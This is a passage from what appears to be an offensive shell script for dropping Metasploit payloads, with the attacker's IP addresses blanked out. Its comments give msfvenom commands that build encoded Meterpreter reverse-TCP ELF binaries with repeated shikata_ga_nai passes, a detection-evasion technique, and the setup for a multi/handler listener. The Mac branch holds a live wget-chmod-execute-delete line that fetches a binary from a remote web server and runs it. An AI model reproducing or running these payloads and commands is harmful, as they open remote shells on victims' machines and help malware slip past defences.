echo "script will probably not work as is because the IPs and ports were hardcoded and In only did a string replace to crete the first 3 variables to not expose infra. likely not enough with the different escaping context"
echo "I'd recommend you string replace it back hardcoding your own, or send me an MR to fix this"
exit 1
WEBSERVER_IP=""
WEBSERVER_PORT=""
HANDLER_IP=""
...
if [ "$machine" == "Linux" ]; then
    # staged going to $HANDLER_IP:4444  
    ...
    # unstaged going to $HANDLER_IP:4343  
    # webserver at $WEBSERVER_IP:$WEBSERVER_PORT
    # use exploit/multi/handler
    ...
    # set lhost 0.0.0.0
    # run -j -z
    # msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$HANDLER_IP LPORT=4343 -e x86/shikata_ga_nai -i 19 -f elf > m_shi_iter.elf1
    # msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=$HANDLER_IP LPORT=4343 -e x86/shikata_ga_nai -i 19 -f elf > m_shi_iter.elf
    # msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$HANDLER_IP LPORT=4343 -e x86/shikata_ga_nai -f elf > m_shi.elf1
...
if [ "$machine" == "Mac" ]; then
    ...
    wget http://$WEBSERVER_IP:$WEBSERVER_PORT/meh.elf -O meh.elf && chmod +x ./meh.elf && ./meh.elf & rm ./meh.elf
